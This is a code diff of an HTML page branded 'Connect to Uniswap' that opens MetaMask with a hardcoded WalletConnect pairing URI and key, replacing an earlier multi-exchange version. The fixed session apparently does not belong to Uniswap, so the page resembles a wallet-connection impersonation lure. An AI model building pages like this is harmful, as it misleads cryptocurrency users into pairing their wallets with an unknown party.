@@ -3,112 +3,100 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connect to DApp (Mobile)</title>
-    
-    <!-- WalletConnect v2 Dependencies -->
-    <script src="https://unpkg.com/@walletconnect/web3-provider@2.9.2/dist/umd/index.min.js"></script>
-    <script src="https://unpkg.com/@walletconnect/ethereum-provider@2.9.2/dist/umd/index.min.js"></script>
-    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
-    
+    <title>Connect to Uniswap</title>
     <style>
         body {
             font-family: Arial, sans-serif;
             text-align: center;
-            margin: 20px;
+            margin: 0;
+            padding: 20px;
             background-color: #f0f0f0;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
         .container {
-            max-width: 600px;
-            margin: 50px auto;
-            padding: 20px;
             background: white;
-            border-radius: 10px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            width: 90%;
+        }
+        h1 {
+            color: #333;
+            margin-bottom: 30px;
         }
         button {
-            padding: 12px 24px;
-            margin: 10px;
-            background-color: #007bff;
+            background-color: #ff007a;
             color: white;
             border: none;
-            border-radius: 5px;
+            padding: 15px 30px;
+            border-radius: 12px;
+            font-size: 18px;
             cursor: pointer;
-            font-size: 16px;
-            transition: background-color 0.3s;
+            transition: transform 0.2s, background-color 0.2s;
+            width: 100%;
+            max-width: 300px;
+            font-weight: bold;
         }
         button:hover {
-            background-color: #0056b3;
+            background-color: #cc0062;
+            transform: translateY(-2px);
         }
         #status {
             margin-top: 20px;
             color: #666;
-            padding: 10px;
+            line-height: 1.5;
         }
-        .address {
-            word-break: break-all;
-            font-family: monospace;
-            background: #f5f5f5;
-            padding: 10px;
-            border-radius: 5px;
-            margin: 10px 0;
+        .link {
+            color: #ff007a;
+            text-decoration: none;
         }
-        .button-group {
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-            align-items: center;
-            margin: 20px 0;
+        .link:hover {
+            text-decoration: underline;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Connect to DApp</h1>
-        <div class="button-group">
-            <button onclick="connectTo1inch()">Connect to 1inch</button>
-            <button onclick="connectToUniswap()">Connect to Uniswap</button>
-            <button onclick="connectToPancakeSwap()">Connect to PancakeSwap</button>
-        </div>
+        <h1>Connect to Uniswap</h1>
+        <button onclick="connectToUniswap()">Connect Wallet</button>
         <div id="status"></div>
     </div>
 
     <script>
-        const status = document.getElementById('status');
-
-        function openWalletConnect(wcUrl, dappName) {
-            status.textContent = `Opening ${dappName}...`;
-
-            // For iOS devices
-            if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
-                window.location.href = `https://metamask.app.link/wc?uri=${encodeURIComponent(wcUrl)}`;
-            } 
-            // For Android devices
-            else if (/Android/i.test(navigator.userAgent)) {
-                window.location.href = `metamask://wc?uri=${encodeURIComponent(wcUrl)}`;
+        const UNISWAP_WC_URL = "wc:5feb7d81-ca93-4f43-9a74-5b6f1d831876@2?relay-protocol=irn&symKey=99436c39f5c3edd59c2834c2795a335e3f661a7dfb42a1def10af34f864b7824";
+        
+        async function connectToUniswap() {
+            const status = document.getElementById('status');
+            
+            try {
+                status.textContent = 'Opening MetaMask...';
+                
+                // Create the universal deep link
+                const encodedUri = encodeURIComponent(UNISWAP_WC_URL);
+                const universalLink = `https://metamask.app.link/wc?uri=${encodedUri}`;
+                
+                // Open MetaMask
+                window.location.href = universalLink;
+                
+                // Show instructions after a short delay
+                setTimeout(() => {
+                    status.innerHTML = `
+                        <p>Check MetaMask to approve the connection.</p>
+                        <p>If MetaMask didn't open, <a href="${universalLink}" class="link">click here to try again</a></p>
+                    `;
+                }, 1500);
+                
+            } catch (error) {
+                console.error('Connection error:', error);
+                status.innerHTML = `
+                    <p>Error: ${error.message}</p>
+                    <p>Please make sure MetaMask is installed and try again.</p>
+                `;
             }
-            // For desktop
-            else {
-                window.location.href = `metamask://wc?uri=${encodeURIComponent(wcUrl)}`;
-            }
-
-            setTimeout(() => {
-                status.textContent = `Check MetaMask to connect to ${dappName}!`;
-            }, 1000);
-        }
-
-        function connectTo1inch() {
-            const wcUrl = "wc:7a2891b3-146c-4bc9-9828-7402a09f8a25@2?relay-protocol=irn&symKey=6fb1c64b8c1d1c8c7a057f8b3c22aa87c5e2aadb5b4ae1ea7beb2c42b6105f0b";
-            openWalletConnect(wcUrl, "1inch");
-        }
-
-        function connectToUniswap() {
-            const wcUrl = "wc:c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96@2?relay-protocol=irn&symKey=587d5484ce2a2a6ee3ba1962fdd7e5d8871878864108069f0f30e30306a8bd17";
-            openWalletConnect(wcUrl, "Uniswap");
-        }
-
-        function connectToPancakeSwap() {
-            const wcUrl = "wc:8f66151f5a1b5a49cc0a45e160c93f486ee649f1e9499f2c08d59d8048437bbb@2?relay-protocol=irn&symKey=7ff0c1a20acd76d98b70651c2986e9642e35f5f8e5df7c1bc63b0bbb7b93e875";
-            openWalletConnect(wcUrl, "PancakeSwap");
         }
     </script>
 </body>
